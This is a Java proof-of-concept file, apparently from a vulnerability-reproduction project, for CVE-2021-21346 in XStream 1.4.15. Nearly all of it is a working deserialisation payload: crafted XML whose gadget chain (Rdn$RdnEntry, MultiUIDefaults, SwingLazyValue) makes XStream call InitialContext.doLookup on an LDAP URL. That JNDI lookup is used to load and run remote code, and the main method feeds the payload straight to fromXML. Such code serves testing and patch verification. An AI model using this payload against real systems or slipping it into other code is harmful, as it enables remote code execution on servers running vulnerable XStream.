package com.sectrend.xstream_v1_4_15;

import com.thoughtworks.xstream.XStream;

/**
 * @author 周德鹏
 * @version 1.0
 * @date 2023/9/20 16:50
 * @describe
 */
public class XSteamPoc_CVE_2021_21346 {
    public static void main(String[] args) {

        String xml = "<sorted-set>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>ysomap</type>\n" +
                "    <value class='javax.swing.MultiUIDefaults' serialization='custom'>\n" +
                "      <unserializable-parents/>\n" +
                "      <hashtable>\n" +
                "        <default>\n" +
                "          <loadFactor>0.75</loadFactor>\n" +
                "          <threshold>525</threshold>\n" +
                "        </default>\n" +
                "        <int>700</int>\n" +
                "        <int>0</int>\n" +
                "      </hashtable>\n" +
                "      <javax.swing.UIDefaults>\n" +
                "        <default>\n" +
                "          <defaultLocale>zh_CN</defaultLocale>\n" +
                "          <resourceCache/>\n" +
                "        </default>\n" +
                "      </javax.swing.UIDefaults>\n" +
                "      <javax.swing.MultiUIDefaults>\n" +
                "        <default>\n" +
                "          <tables>\n" +
                "            <javax.swing.UIDefaults serialization='custom'>\n" +
                "              <unserializable-parents/>\n" +
                "              <hashtable>\n" +
                "                <default>\n" +
                "                  <loadFactor>0.75</loadFactor>\n" +
                "                  <threshold>525</threshold>\n" +
                "                </default>\n" +
                "                <int>700</int>\n" +
                "                <int>1</int>\n" +
                "                <sun.swing.SwingLazyValue>\n" +
                "                  <className>javax.naming.InitialContext</className>\n" +
                "                  <methodName>doLookup</methodName>\n" +
                "                  <args>\n" +
                "                    <arg>ldap://localhost:1099/CallRemoteMethod</arg>\n" +
                "                  </args>\n" +
                "                </sun.swing.SwingLazyValue>\n" +
                "              </hashtable>\n" +
                "              <javax.swing.UIDefaults>\n" +
                "                <default>\n" +
                "                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>\n" +
                "                  <resourceCache/>\n" +
                "                </default>\n" +
                "              </javax.swing.UIDefaults>\n" +
                "            </javax.swing.UIDefaults>\n" +
                "          </tables>\n" +
                "        </default>\n" +
                "      </javax.swing.MultiUIDefaults>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>ysomap</type>\n" +
                "    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n" +
                "      <m__obj class='string'>test</m__obj>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "</sorted-set>";

        System.out.println("开始");
        XStream xstream = new XStream();
        xstream.fromXML(xml);
        System.out.println("结束");
    }
}
